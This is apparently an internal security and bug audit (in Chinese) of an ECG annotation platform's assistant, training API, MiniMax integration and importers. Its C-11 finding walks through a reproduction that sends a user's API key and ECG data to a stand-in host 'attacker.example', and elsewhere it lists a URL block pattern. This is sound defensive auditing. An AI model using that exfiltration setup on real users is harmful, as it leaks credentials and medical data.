# Track C: Assistant + Training + MiniMax + GitHub URL 导入链路 (2026-07-07)

审计范围：本项目 Track C 文件(只读),覆盖 Assistant 前端 / 后端、训练面板与 API、MiniMax 链路、GitHub Raw URL 导入、`ecgParser.ts`、`httpClient`、`offlineQueue`,以及 `CaseList/CaseDetail/Dashboard`。本轮不修改任何业务代码,不跑 build / pytest。

参考前置文档:

- `AUDIT-2026-07-04-model-canvas.md` 中的 R-05 / R-16 / R-19 风险点
- `.planning/current-bug-audit-2026-07-04/findings.md` 中的 #2 / #3 / #4 / #6

前置审计已修复项(本次复核):

| 旧 ID | 主题 | 现状 | 复核证据 |
|------|------|------|----------|
| findings.md #3 | 自动 R 峰缺 `y` | **已修** | `buildAutoRPeakAnnotations` (`src/components/Canvas/autoRPeakAnnotations.ts:43-89`) 现用 `computeCanvasPointForSample` 主动算 `{x,y}`,不再依赖 `y ?? 0` 兜底 |
| findings.md #4 | `createPatient` fallback 重复 ID | **已修** | `clinicApi.ts:128-143` 用 `generatedFallbackPatientIds` + 单调 seq;`test('createPatient fallback ids remain stable and unique across many consecutive failed calls')` |
| findings.md (closure)| 历史/测试覆盖 | 部分修 | 训练 round 删除前后端合同已合(`trainingApi.ts:345-356` 带 `?confirm=...`),TrainTaskConfig runner 白名单已加 |

---

## 0. 速读表

| # | 轴 | 一句话结论 | Severity | AUDIT 对照 / 前置 |
|---|----|-----------|----------|-----------|
| C-01 | Assistant service prompt 合规 | Assistant `ask()` / `_build_case_answer` 答案只描述病例元数据,严格符合"不输出诊断结论"约束 | OK | 复核 CLAUDE.md 安全约束 |
| C-02 | Assistant sources 暴露 | `/api/assistant/case/analyze` 与 `ask` 均返回 `sources[]`,前端 `SmartAssistancePanel` 显式渲染,**符合 CLAUDE.md sources 必暴露约束** | OK | 复核 |
| C-03 | Assistant 训练诊断 | `diagnose_training` 不暴露路径/命令行,evidence 仅由 round 名 + 指标组成,无 filesystem leak | OK | 复核 |
| C-04 | Training SSE 降速 | 训练中 2s 轮询 / idle/done 30s 轮询;`param-stats` 5s 训练中、idle 后 30s。**符合 CLAUDE.md "避免长时间占用连接"约定** | OK | 复核 |
| C-05 | Training 删除合同 | 前后端合同已对齐,`?confirm=<round>` 已带 | OK | 复核 + 已修 |
| C-06 | RAG fallback 写入 | `rag_store.rebuild()` 在 docs/ 不存在时**会原地创建** `docs/assistant/knowledge-base.md` 并写入仓库。生产部署若 sidecar 有 repo_root 写权限,会污染 repo | P1 | 新发现 |
| C-07 | RAG store repo_root 暴露 | `/api/assistant/ask` 与 `/api/assistant/knowledge/rebuild` 的 `errors[]` 字段带绝对文件路径,失败响应信息泄漏给前端 | P1 | 新发现 |
| C-08 | Assistant 错误吞栈 | `ecgAssistantApi` 仅 `throw new Error('助手查询失败')` 不带状态码/原因,前端 message 仅显示"助手查询失败"五字 | P2 | 新发现(信息可观测性) |
| C-09 | GitHub Raw URL suspiciousPatterns | `/:/` 仍合法阻断 `https://raw.githubusercontent.com/user/repo/main/path:withColon.json`,R-19 未修 | P2 | 残留 R-19 |
| C-10 | GitHub URL 末尾扩展名无校验 | `parseJsonTextAndApply` 强制 JSON,GitHub 拉下来若服务端返回 HTML(404 页面、repo 私有、过期)会被 `JSON.parse` 抛出 → 用户看到"Invalid JSON" 而非 "URL 404/权限" | P2 | 新发现 |
| C-11 | MiniMax 直连分支 CORS / 数据外发 | `useProxy=false` 时浏览器 fetch 用户输入 endpoint 携带 `Authorization: Bearer <userKey>` → 第三方 endpoint,任意 SSRF;UI 明示"Direct API call (not recommended)"但仍暴露 | P1 | 残留 R-16 + 新发现 |
| C-12 | MiniMax analyzeViaProxy 永远是 404 | `minimaxService.ts:18` POST 到相对路径 `/api/ecg/analyze`,但 `proxy-server/main.py` 无该路由,`webpack.config*.js` 无 devServer proxy。**默认部署 404**;依赖手动跑 `proxy-server/minimax-proxy.js` (端口 3001),`run_platform.bat` 也不启它 | P0 | 新发现(部署时一定踩) |
| C-13 | MiniMax 提示模型 | 两个分支都用 `abab6.5s-chat` 作为默认 model,proxy 侧 `minimax-proxy.js:142` 也用同样默认值;若 `abab6.5s-chat` 被弃用,两条路径全 fail 且无降级 | P2 | 新发现 |
| C-14 | HL7 parser — 仍脆弱 | `atob` 后每 4 字节切 Float32、未处理 base64 padding、未处理字节序、duration 写死 500 Hz、ECG 字段判断脆弱,真 ORU^R01 多半空 | P1 | 残留 R-05 |
| C-15 | HL7 / WFDB 文件入口断裂 | `ecgParser.ts` `parseECG` 在 `json` 分支用 `JSON.parse(data as string)`,**wfdb 路径根本未接入** `parseECG`,即使有 `WFDBParser` 类 | P1 | 新发现(A-05 平行) |
| C-16 | httpClient AbortController 永远清理 | `requestJson` `setTimeout` + `clearTimeout` 走 finally 干净;**但 `timeoutMs` 不传时直接 try/catch,AbortController 不创建**,网络慢仍会无限挂 | P2 | 新发现 |
| C-17 | httpClient `isNetworkError` 误判 5xx | 当 backend 返回 500 时 `HttpError.status === 500`,`isNetworkError()` 返回 false,**fallback 永远不会触发**;Sidecar 挂时 500 与 refused 走两条路径,fallback 行为不一致 | P2 | 新发现 |
| C-18 | offlineQueue 没有 retry 上限 | `markFailed` 仅 ++ `retryCount`,`syncPendingActions` 不看 `retryCount`。网络长时间不可达时 pending actions 永远停 `remaining`,`useOfflineMode.syncNow()` 调用空 `{}` 全错 | P2 | findings.md #6 变体(原话"保留并标错") |
| C-19 | offlineQueue `useOfflineMode.syncNow` 用空 executor | 调用 `syncPendingActions(actions, {})`,所有 action 都会"无 executor"失败保留。`console.error` 不会重试、不会丢弃 | P1 | findings.md #6 同源 |
| C-20 | 详情弹窗 log/eval/param 失败只 console | `loadTrainingRoundDetails` 抛 `missing: ['log','eval','paramStats']`,但 `TrainingDashboard.tsx:172-178` 仅 `console.error`,用户弹窗看到空面板无任何提示 | P2 | 新发现(可观测性) |
| C-21 | `getHistoryLog/Eval/ParamStats` round 名未 encode | `trainingApi.ts:260/266/272` 路径直接 `${round}`,`deleteTrainingRound` 反而 `encodeURIComponent`,合同不一致 | P2 | 新发现 |
| C-22 | `parseTrainingStreamEvent` JSON parse 兜底只返 null | 空 data / 多行 SSE 全丢弃到 `onError?.(new Event('parse_error'))`,前端 EventSource 一直对不上 stream,UI 无明显状态 | P2 | 新发现 |

Severity 标度:

- **P0** = 在正常使用 / 默认部署路径下会失败或泄露
- **P1** = 损坏 demo 体验或安全/合规旁路
- **P2** = 可观测性 / 一致性 / 边缘行为
- **P3** = 代码卫生

---

## 1. Assistant 前后端

### 1.1 [OK] Assistant prompts 不输出诊断结论 (C-01)

- **文件:行号**: `proxy-server/assistant/service.py:44-145`, `proxy-server/assistant/case_analysis.py:76-101`
- **证据**: 答案模板只描述"记录 / 主分析导联 / 信号质量 / 标注类型分布 / 标注来源(手工/自动) / AI 结果概率 top 3",并显式 `answer_parts.append("这些内容仅用于标注工作流参考，不能替代临床诊断。")` (`service.py:145`)。
- **复核结果**: 符合 CLAUDE.md "Assistant v1 安全约束:UI 用'辅助/参考/上下文检索',**不**输出'诊断结论'"。

### 1.2 [OK] Assistant sources 显式暴露 (C-02)

- **文件:行号**: `proxy-server/assistant/service.py:46-82` (ask 方法返回 `{mode, answer, sources}`);`proxy-server/assistant/case_analysis.py:95-101` (analyze 返回 `sources[]`);前端 `SmartAssistancePanel.tsx:280-295, 302-317` 在 case analysis 与 answer 两个分支都显式渲染 `source.title / source.path / source.snippet`
- **证据**:
  ```ts
  // service.py:46-59
  sources = [self._build_case_source(context)] + knowledge_matches[:3]
  ...
  return {"mode": "case", "answer": answer, "sources": sources}
  ```
- **复核结果**: 符合 CLAUDE.md "答案必须暴露 sources"。

### 1.3 [OK] Training diagnostics 不泄漏文件系统路径或命令行 (C-03)

- **文件:行号**: `proxy-server/assistant/training_diagnostics.py:40-95, 156-205`
- **证据**: 所有 `evidence`/`recommendedRound`/`bestRound` 只含 round 名 + 数值,没有任何 `path` / `params` 字段;`recommendedRound` 来自 `state.py::list_history_rounds` 的 `path` 字段 (`state.py:454`),**注意** 该 `path` 是 round 目录绝对路径,但只在 `_build_case_source` (`service.py:91-98`) 暴露给 case 分支,training diagnostics 不暴露它。
- **复核结果**: training diagnostics 不暴露路径。

### 1.4 [OK] SSE 训练 / idle 降速 (C-04)

- **文件:行号**: `proxy-server/main.py:170-189` (state stream), `proxy-server/main.py:201-220` (param-stats stream)
- **证据**:
  ```python
  # main.py:184-186
  sleep_interval = 2 if status in ("training", "running") else 30
  await asyncio.sleep(sleep_interval)
  ...
  # main.py:217-219 (param stream)
  sleep_interval = 5 if idle_count < 6 else 30
  ```
- **复核结果**: 训练中 2s/5s 轮询,idle 6 个 tick 后降为 30s,避免长时间占用连接(符合 CLAUDE.md 约定)。

### 1.5 [OK] Training 删除合同已对齐 (C-05)

- **文件:行号**: `src/services/trainingApi.ts:345-356`, `proxy-server/main.py:275-301`
- **证据**:
  ```ts
  // trainingApi.ts:350-352
  const encodedRound = encodeURIComponent(round);
  const res = await fetch(`${API_BASE}/api/training/history/${encodedRound}?confirm=${encodedRound}`, {
    method: 'DELETE',
  });
  ```
  ```python
  # main.py:285-290
  if confirm != round_name:
      raise HTTPException(status_code=400, detail="Pass ?confirm=<round_name> to acknowledge deletion")
  ```
- **复核结果**: 前后端合同一致,且前端做 `encodeURIComponent` 兼容特殊字符路径。

---

## 2. Assistant 后端 — 新发现

### 2.1 [P1] RAG store fallback 会在 repo 内创建文件 (C-06)

- **文件:行号**: `proxy-server/assistant/rag_store.py:48-65`
- **问题**:
  ```python
  # rag_store.py:48-65
  docs_dir = self.repo_root / "docs"
  if docs_dir.exists() and docs_dir.is_dir():
      for md_file in docs_dir.rglob("*.md"):
          ...
  if doc_count == 0 and not errors:
      fallback_file = docs_dir / "assistant" / "knowledge-base.md"
      fallback_file.parent.mkdir(parents=True, exist_ok=True)
      if not fallback_file.exists():
          fallback_file.write_text(FALLBACK_KNOWLEDGE, encoding="utf-8")
  ```
- **风险**:
  1. `REPO_ROOT = Path(__file__).resolve().parents[1]` (`main.py:43`),指向仓库根。
  2. 当 docs/ 存在但 `rglob("*.md")` 没结果(空目录或子目录全是其他类型)时,`doc_count == 0` + `not errors` 为真,直接 `write_text(FALLBACK_KNOWLEDGE)` 在仓库写文件。
  3. 生产部署把 sidecar 当 long-running 进程跑时,会污染 git working tree。
  4. 任意用户调一次 `POST /api/assistant/knowledge/rebuild` 就能触发(且前端 `SmartAssistancePanel.handleRebuildKnowledge` 没有确认弹窗)。
- **复现命令**:
  ```bash
  # Windows PowerShell
  Invoke-WebRequest -Method POST http://localhost:6090/api/assistant/knowledge/rebuild -UseBasicParsing
  Get-ChildItem docs/assistant/ -ErrorAction SilentlyContinue
  # 期望:knowledge-base.md 在 docs/assistant/ 下被自动创建
  ```
- **修复方向**(不改代码):
  - 把 fallback 输出到 `gettempdir()` / `/var/lib/<app>/assistant/` 之类 sidecar 数据目录,而不是仓库
  - 或 `FALLBACK_KNOWLEDGE` 仅入内存 chunk,不落盘

### 2.2 [P1] Assistant error response 暴露绝对文件路径 (C-07)

- **文件:行号**: `proxy-server/assistant/rag_store.py:44-46, 53-55`
- **证据**:
  ```python
  except Exception as exc:
      errors.append({"path": str(file_path), "error": str(exc)})
  ...
  return {
      "ok": len(errors) == 0,
      ...
      "errors": errors,
  }
  ```
- **风险**:
  - `file_path` 是 `self.repo_root / "..."` 的绝对路径,直接暴露给前端。
  - `error` 字段若来自 `read_text()` 则通常无害,但若来自 `read_text` + 自定义 OSError 可能把 `winerror` 编号、磁盘路径暴露。
  - 与 RAG fallback 写仓库(C-06)叠加:失败时 path 已暴露,成功时仓库已被改,前端使用者可在 attack scenario 中枚举仓库布局。
- **复现命令**:
  ```bash
  # 临时把 README.md 设成无权限读 (需 Docker / 真实环境)
  chmod 000 README.md
  curl -X POST http://localhost:6090/api/assistant/knowledge/rebuild
  # 响应:{"errors":[{"path":"D:\\...\\README.md","error":"[Errno 13] Permission denied: '...README.md'"}]}
  ```
- **修复方向**:
  - 把 `errors` 只在 sidecar 日志里记录,不进 JSON 响应
  - 或改为 `{filename: <basename>, code: <sanitized_code>}` 形式

### 2.3 [P2] Assistant API 错误丢失根因 (C-08)

- **文件:行号**: `src/services/ecgAssistantApi.ts:91-129`, 全文 5 个函数
- **证据**:
  ```ts
  if (!res.ok) throw new Error('知识库重建失败');
  // ... 同模式: '病例上下文记录失败' / '病例风险分析失败' / '助手查询失败'
  ```
- **问题**:
  - 错误消息全是固定中文短语,**没有 HTTP status** / response body / URL。前端 `message.error(error.message)` 用户看不到 4xx / 5xx 区分。
  - 前端单元测试 (`ecgAssistantApi.test.ts`) 只测了 happy path 与 fetch throw,没有任何 `res.status !== 200` 分支覆盖 (`test('checkAssistantHealth returns unavailable when the sidecar cannot be reached')` 写的是 fetch throw,不是 4xx)。
- **修复方向**: 把后端 detail 带过来 (`throw new Error(\`助手查询失败: HTTP ${res.status}\`)`),或暴露 `{status, body, url}` 三元组。

---

## 3. GitHub Raw URL 导入

### 3.1 [P2] R-19 残留:`/:/` 仍误判合法 URL (C-09)

- **文件:行号**: `src/pages/AnnotationStudio.tsx:498-512`
- **证据** (与 AUDIT-2026-07-04 R-19 完全一致):
  ```ts
  const validHosts = ['raw.githubusercontent.com', 'raw.githubusercontent.org'];
  if (!validHosts.includes(parsedUrl.hostname.toLowerCase())) {
    message.warning('只支持 GitHub Raw (raw.githubusercontent.com) 链接');
    return;
  }
  const suspiciousPatterns = [/@/, /:/, /\.\./, /localhost/i, /127\.0\.0\.1/i, /0x/i];
  const fullUrl = url.toLowerCase();
  for (const pattern of suspiciousPatterns) {
    if (pattern.test(fullUrl)) {
      message.warning('检测到可疑 URL 模式，已拒绝');
      return;
    }
  }
  ```
- **问题**:
  - `/:/` 误伤所有带端口或 query 含 `:` 的 URL(虽然 raw URL 不带端口,query 也基本不带 `:`,但**未来允许 query encoding 后会被无端拦截**)。
  - `raw.githubusercontent.org` 是非官方镜像,不应当作白名单 host(给出可信感但实际没人用)。
  - regex 注释仍只是 "Additional security: reject URLs with suspicious patterns",**未说明每条 pattern 挡什么**。
- **SSRF 真实边界**:
  - 已经过 `validHosts` 限制 → host 只能是 raw.githubusercontent.com/.org,后端 fetch 是浏览器→github,不存在 SSRF 内网穿透。
  - 风险等级实际是 P2,但**应保留为安全剧场演示**,便于审计可读性。
- **修复方向**:
  - 移除 `/:/`(无实际保护作用)
  - 删除 `raw.githubusercontent.org` 条目,或显式注释"保留以兼容未来 mirror"
  - 把每条 regex 配上注释: `/@/` → 防 `user:pass@phishing.example` 形态

### 3.2 [P2] GitHub URL 拉取后强 JSON.parse,无 MIME / 状态码校验 (C-10)

- **文件:行号**: `src/pages/AnnotationStudio.tsx:514-527`, `src/pages/AnnotationStudio.tsx:326-?` (parseJsonTextAndApply)
- **证据**:
  ```ts
  // 519-522
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`下载失败: HTTP ${response.status}`);
  }
  const text = await response.text();
  await parseJsonTextAndApply(text);
  ```
- **问题**:
  - `response.ok` 不区分 200 与 3xx 已跟随(其实浏览器 fetch 默认 follow redirect 到 200),但**当 repo 私有、文件被删除、ref 不存在时,GitHub 返回 404 HTML 页面**。
  - `parseJsonTextAndApply` 直接 `JSON.parse(text)`,HTML body 抛错 → 用户看到 "Invalid JSON" 错误,**不知道是权限 / 404 / 速率限制**。
  - 无 `Content-Type` 校验,无 size cap(可被恶意 repo 返回大文件)。
- **复现**:
  ```bash
  # 输入:https://raw.githubusercontent.com/<any-user>/<any-repo>/main/notexist.json
  # 期望:GitHub 返回 404 + HTML;前端抛 "Invalid JSON"
  ```
- **修复方向**:
  - 检查 `response.headers.get('content-type')` 必须含 `application/json` 或 `text/plain`
  - 用 `AbortController` + `response.body.getReader()` 限流
  - 4xx / 5xx 时显示后端响应 body 前 200 字符

---

## 4. MiniMax / analyzeECG

### 4.1 [P0] analyzeViaProxy 默认永远 404 (C-12)

- **文件:行号**: `src/services/minimaxService.ts:18, 36-75`, `proxy-server/main.py` 路由(无 `/api/ecg/analyze`), `webpack.config.dev.js` (无 devServer proxy), `webpack.config.js` (无 plugin proxy), `proxy-server/run_platform.bat` (只启动 FastAPI + finetune_runner + param_observer,**不启动 minimax-proxy.js**)
- **证据**:
  ```ts
  // minimaxService.ts:18
  const PROXY_ENDPOINT = '/api/ecg/analyze';
  ```
  ```ts
  // minimaxService.ts:36-75 (节选)
  if (useProxy) {
    return this.analyzeViaProxy(signalData, config);  // POST /api/ecg/analyze
  }
  ```
  ```js
  // minimax-proxy.js:103 才有 /api/ecg/analyze 路由
  if (pathname === '/api/ecg/analyze' && req.method === 'POST') {
  ```
- **问题**:
  1. `proxy-server/main.py` 路由表:**只有** `/health`, `/api/assistant/*`, `/api/training/*`, `/api/checkpoints*` — **完全没有 `/api/ecg/analyze`**。
  2. `webpack.config.dev.js` `devServer` 配置**只有** `port / hot / static`,**没有 `proxy`** 字段 → dev 模式也不会自动转发到 `minimax-proxy.js` 端口 3001。
  3. `proxy-server/run_platform.bat` 只启动 3 个进程,**minimax-proxy.js 没被启动**。
  4. 用户即便手动跑 `node proxy-server/minimax-proxy.js`,FastAPI sidecar (6090) 与 Minimax proxy (3001) 是两个独立进程,前端 `/api/ecg/analyze` 同源请求根本到不了 3001 —— 必须额外配 devServer proxy 或 nginx。
  5. 单测 `minimaxService.test.ts:25-117` 通过 mock fetch stub,测不到任何真实路径,所以这个 bug **从来没被发现**。
- **复现**:
  ```bash
  # 1. 启 FastAPI sidecar
  cd proxy-server; python -m uvicorn main:app --port 6090
  # 2. 启 dev server
  npm run dev:web
  # 3. 浏览器:AnnotationStudio → Minimax 区块不填 endpoint/key(默认走 proxy)
  # 4. DevTools Network:POST /api/ecg/analyze → 404 (webpack dev server 直返)
  # 5. 服务端日志:无任何请求记录
  ```
- **风险等级 P0**:
  - 默认行为 broken,所有用户首点"Minimax 分析(代理)"路径直接失败
  - 用户大概率切到 `useProxy=false`,把 API key 复制到 UI 输入框 → C-11 数据外发风险
  - 给演示带来误印象"MiniMax 接不上"
- **修复方向**:
  - 把 `/api/ecg/analyze` 加到 `proxy-server/main.py` 路由(同进程内转发,避免端口分裂)
  - 或在 FastAPI sidecar 启动时自动检测 `proxy-server/minimax-proxy.js` 子进程
  - 或 dev 配置加 `devServer.proxy: [{ context: ['/api/ecg'], target: 'http://localhost:3001' }]`
  - **`run_platform.bat` 必须启动 minimax-proxy 或在 main.py 内 inline 实现**

### 4.2 [P1] useProxy=false 直连分支 SSRF + API key 外发 (C-11)

- **文件:行号**: `src/services/minimaxService.ts:77-128`, `src/pages/AnnotationStudio.tsx:622-652`
- **证据**:
  ```ts
  // minimaxService.ts:108-115
  const response = await fetch(config.endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${config.apiKey}`,
    },
    body: JSON.stringify(payload),
  });
  ```
  ```tsx
  // AnnotationStudio.tsx:622-644 (handleMinimaxAnalyze) 重复声明 hasDirectConfig/useProxy
  const hasDirectConfig = minimaxEndpoint.trim() && minimaxApiKey.trim();
  const useProxy = !hasDirectConfig;
  if (!useProxy && (!minimaxEndpoint.trim() || !minimaxApiKey.trim())) {
    message.warning('请先填写 Minimax Endpoint 和 API Key');
    return;
  }
  setMinimaxLoading(true);
  try {
    const signalData = leads.map((lead) => lead.data);
    const hasDirectConfig = minimaxEndpoint.trim() && minimaxApiKey.trim();  // ← 重声明
    const useProxy = !hasDirectConfig;                                          // ← 重声明
    const predictions = await minimaxService.analyzeECG(signalData, {
      endpoint: minimaxEndpoint.trim(),
      apiKey: minimaxApiKey.trim(),
      ...
      useProxy,
    });
  ```
- **风险**:
  1. **API key 直接外发**:用户在 UI 输入 `Minimax API Key`,代码会把它原样 `Authorization: Bearer` 发送到 `config.endpoint`。任何人只要把 endpoint 填到 `https://attacker.example/collect`,就拿到 user 的 key + ECG signal。
  2. **CORS**:正常 MiniMax endpoint 会给浏览器返回 `Access-Control-Allow-Origin` 才会成功;若用户输入一个无 CORS 头的 endpoint,请求会发出去但浏览器卡 CORS,**错误信息只说"CORS",用户不知数据已外发**。
  3. **endpoint 是任意 URL**:含 `https://internal.lan/...`、`https://10.0.0.1/...`、`file:///etc/passwd`、`gopher://...` — 浏览器 fetch 多数会拦,但**`https://任意公网 IP` 全开**。
  4. **R-16 重复声明** 仍存在(AUDIT 已记):`AnnotationStudio.tsx:623-624` 已经在 scope 顶部声明 `hasDirectConfig / useProxy`,又在 try 块内 636-637 行重复声明 — 死后代码不可见,后续读代码者容易误解"这是不同的逻辑"。
  5. **C-12 的 404 + C-11 的直连** 是耦合链:proxy 永远 404 → 用户不得不切直连 → API key 外发。两者必须同时修。
- **复现**:
  ```text
  1. 用户打开 AnnotationStudio
  2. 在 Minimax panel 输入:
     Endpoint: https://attacker.example/collect
     API Key: sk-test-from-env
  3. 点 "开始 Minimax 分析"
  4. DevTools Network:POST https://attacker.example/collect, header 含 Bearer sk-test-from-env
  5. attacker 服务器收到完整 ECG signal + API key
  ```
- **修复方向**:
  - **删除 `useProxy=false` 分支**(C-12 修复后已无意义)
  - 或要求 endpoint 必须命中白名单域名(类似 GitHub Raw 的 `validHosts`)
  - 移除外露的 UI API key 输入框,只走 `process.env.MINIMAX_API_KEY` 后端代理
  - **删除 R-16 重复声明**(死代码)

### 4.3 [P2] MiniMax 默认 model `abab6.5s-chat` 已可能弃用 (C-13)

- **文件:行号**: `src/services/minimaxService.ts:51, 89`, `proxy-server/minimax-proxy.js:142`
- **证据**:
  ```ts
  // minimaxService.ts:51, 89
  model: config.model || 'abab6.5s-chat',
  // minimax-proxy.js:142
  model: parsedBody.model || 'abab6.5s-chat',
  ```
- **风险**:
  - `abab6.5s-chat` 是 Minimax 一代 chat 模型,2026 年是否仍可用未知。CLAUDE.md `REACT_APP_MINIMAX_API_ENDPOINT` 描述为"Minimax 直连(生产请走后端代理)",没有说明默认 model。
  - 前端 / proxy 两侧都用同一个 fallback,用户无提示;若 Minimax 弃用,所有 Minimax 路径静默 fail,C-12 失败 + C-13 失败叠加。
- **修复方向**:
  - 默认 model 移到 `src/config/env.ts` 的 `fromEnv('MINIMAX_MODEL', 'minimax-text-01')`
  - MinMax API 返回 4xx 时,前端 toast 提示 user 检查 model 名
  - 单测覆盖 model 默认值

---

## 5. ECG Parser / Importer (`ecgParser.ts` 与 `utils/dicomParser.ts` 引用)

### 5.1 [P1] HL7 parser 残留 R-05 (C-14)

- **文件:行号**: `src/utils/dicomParser.ts:284-349`
- **证据**: 与 AUDIT-2026-07-04 R-05 **完全一致**,本轮未修:
  ```ts
  // dicomParser.ts:312-334
  for (const obx of obxSegments) {
    const fields = obx.split('|');
    if (fields[3]?.includes('ECG')) {
      const waveformData = fields[5];
      if (waveformData) {
        const decoded = atob(waveformData);                         // ← 无 padding 处理
        const floatArray = new Float32Array(decoded.length / 4);
        for (let i = 0; i < floatArray.length; i++) {
          floatArray[i] = new DataView(
            new Uint8Array([
              decoded.charCodeAt(i * 4),                             // ← UTF-16 charCodeAt
              ...
            ]).buffer
          ).getFloat32(0);                                          // ← 默认 little-endian,真 HL7 多为大端
        }
        ...
        samplingRate: 500
      }
    }
  }
  ```
  ```ts
  // dicomParser.ts:340
  duration: leads[0]?.data.length ? leads[0].data.length / 500 : 0,
  ```
- **问题**(完整保留自 AUDIT-2026-07-04 R-05):
  - `atob` 不处理 base64 padding,长度非 4 倍数时 `decoded.charCodeAt(i*4)` 会返回 `NaN` 然后被当作 0x00
  - 默认 big-endian(OID/默认),真 HL7 多为 little-endian → float 解析错乱
  - `fields[3]?.includes('ECG')` 对真 HL7 v2.x 的 OBX-3 编码系统格式如 `'93000&ECG^CPT'` 误判(matches 上),但对 `'MDC_ECG_WAVEFORM'` 不匹配
  - `samplingRate: 500` 写死 → 真 ORU^R01 多半无法还原
- **修复方向**: 改用 dicompixeldata 风格的官方 HL7 v2.x 解析器、或直接调用 `wfdb`/`pydicom` 后端 fetch。
- **Track A 后续**: 见 `2026-07-07-track-A-model-parser.md` A-04 与 A-05,我未在本文件重复展开。

### 5.2 [P1] WFDB 路径根本未接入 `parseECG` (C-15)

- **文件:行号**: `src/services/ecgParser.ts:1-114` (顶层 `ECGParserService`), `src/utils/dicomParser.ts:378-401` (`parseECG`)
- **证据**:
  ```ts
  // dicomParser.ts:378-401
  export function parseECG(data: ArrayBuffer | string): ECGData | null {
    const format = detectFormat(data);
    switch (format) {
      case 'dicom': ...
      case 'hl7': ...
      case 'json': {
        try { return JSON.parse(data as string); } catch { return null; }
      }
      default:
        return null;
    }
  }
  ```
  ```ts
  // dicomParser.ts:351-376
  export function detectFormat(data: ArrayBuffer | string): 'dicom' | 'wfdb' | 'hl7' | 'json' | 'unknown' {
    ...
    if (typeof data === 'string') {
      if (data.startsWith('MSH')) return 'hl7';
      if (data.startsWith('{') || data.startsWith('[')) return 'json';
      return 'unknown';     // ← 永远返 unknown
    }
    // ArrayBuffer 路径:检查 DICM,无 WFDB 分支
    ...
  }
  ```
- **问题**:
  - `WFDBParser` 类 (`dicomParser.ts:197-282`) 实现完整,有 `.parse(headerFile, dataFile)`;但 `parseECG` 的 switch **没有 `'wfdb'` 分支**。
  - `AnnotationStudio.handleFileUpload` (`AnnotationStudio.tsx:713-`) 上传 `.hea/.dat`,会走单独的 `WFDBParser` 路径,不经过 `parseECG`。所以 WFDB 能在 UI 上工作,但 **`ecgParserService.parseFile` 路径完全不认 WFDB**。
  - `SmartAssistancePanel` 的"如何导入 WFDB 文件"知识库答案会引导用户去 import,而 import 入口会**静默失败**(返 `success: false, error: 'Failed to parse ECG data'` 在 `ecgParser.ts:30`)。
- **复现**:
  ```ts
  import { ecgParserService } from './ecgParser';
  const file = new File(['100 2 360 10800\n100.dat 212 ...'], '100.hea');
  await ecgParserService.parseFile(file);
  // → { success: false, error: 'Failed to parse ECG data' }
  // (detectFormat 返 'unknown')
  ```
- **修复方向**:
  - 在 `ecgParserService.parseFile` 里识别 `.hea/.dat` 扩展名走 `WFDBParser.parse`
  - 或在 `detectFormat` 增加 WFDB 路径(header magic / extension sniff)

---

## 6. httpClient / offlineQueue

### 6.1 [P2] httpClient 默认无超时,网络慢会无限挂 (C-16)

- **文件:行号**: `src/services/httpClient.ts:53-87`
- **证据**:
  ```ts
  export async function requestJson<T>(options: RequestJsonOptions<T>): Promise<T> {
    const method = (options.method || 'GET').toUpperCase();
    const hasBody = typeof options.body !== 'undefined' && options.body !== null;
    const controller = options.timeoutMs ? new AbortController() : null;
    const timeout = controller ? window.setTimeout(...) : null;
    ...
  ```
- **问题**:
  - 调用方不传 `timeoutMs` 时 `controller === null`,`fetch` 不会带 `signal`,**网络慢或 DNS 解析挂会无限卡**。
  - clinicApi.ts / trainingApi.ts / ecgAssistantApi.ts **全部** `requestJson` 调用都没传 `timeoutMs`(`clinicApi.ts:147, 162, 179, 192` 等)。
  - 仅有 fallback 在 `isNetworkError(error)` 时触发,所以浏览器 dev 工具里看 request 状态永远是 pending,直到用户 F5。
- **修复方向**:
  - 加 `defaultTimeoutMs: 30000` 默认值
  - 每处 `requestJson` 调用显式传 `timeoutMs`

### 6.2 [P2] httpClient `isNetworkError` 不识别 5xx fallback (C-17)

- **文件:行号**: `src/services/httpClient.ts:28-40`
- **证据**:
  ```ts
  export const isNetworkError = (error: unknown): boolean => {
    if (!(error instanceof Error)) return false;
    return (
      error.name === 'AbortError' ||
      error.name === 'TypeError' ||
      error.message.includes('fetch') ||
      ...
    );
  };
  ```
- **问题**:
  - `requestJson` 在 4xx/5xx 时 throw `HttpError(status, message)`,`error.message === 'Request failed with status 502'`,**不命中上述任何子串** → `isNetworkError` 返 false → fallback 不触发。
  - 但 sidecar 挂时通常是 `ECONNREFUSED` / `TypeError('fetch failed')` → fallback 触发。
  - **结果**:同一组接口,backend 返回 500 时 `requestJson` 抛 HttpError(用户看到后端 detail),backend 完全 unreachable 时返 mock fallback。**两种 failed 路径行为不一致**,UI 上也会呈现不同 loading 状态。
  - 风险等级 P2,因为不影响默认 demo;但 sidecar 启动后立刻挂掉时会暴露。
- **修复方向**:
  - 把 5xx 也算 network error(或者把 fallback 拆出来:network 走 mock,5xx 走 toast)
  - 或删除 fallback 统一 toast,避免差异

### 6.3 [P2] offlineQueue 没有 retry 上限 (C-18)

- **文件:行号**: `src/services/offlineQueue.ts:22-50`
- **证据**:
  ```ts
  const markFailed = (action: PendingAction, error: unknown): PendingAction => ({
    ...action,
    retryCount: (action.retryCount || 0) + 1,
    lastError: getErrorMessage(error),
  });
  ```
- **问题**:
  - `markFailed` 只 ++ `retryCount`,**没有上限**。`syncPendingActions` 也不看 `retryCount`,所有失败 action 永远在 `remaining` 里。
  - 单测 `offlineQueue.test.ts:27` 验证 `retryCount === 1`,但**没有测 retry 上限,也没有测 retry 累积**。
  - 同源 findings.md #6 提到 "保留并标错",本轮发现更严重:**保留无上限**。
- **修复方向**:
  - 给 `PendingAction` 加 `maxRetries?: number`(默认 5)
  - `markFailed` 在 `(retryCount || 0) >= maxRetries` 时丢弃 action 并 `console.warn`
  - `syncPendingActions` 也显式 return 丢弃列表

### 6.4 [P1] offlineQueue `useOfflineMode.syncNow` 用空 executor (C-19)

- **文件:行号**: `src/hooks/useOfflineMode.ts:80-116`
- **证据**:
  ```ts
  // useOfflineMode.ts:100
  const result = await syncPendingActions(actions, {});
  ```
- **问题**:
  - 调用 `syncPendingActions` 时 `executors = {}`,**所有 action 都会失败**,因为 `executors[action.type]` 永远 undefined (`offlineQueue.ts:36-39`)。
  - 没有真实 network / storage executor 接入,`pendingActions` count 永远不变,sync 永远处于"全部失败"状态。
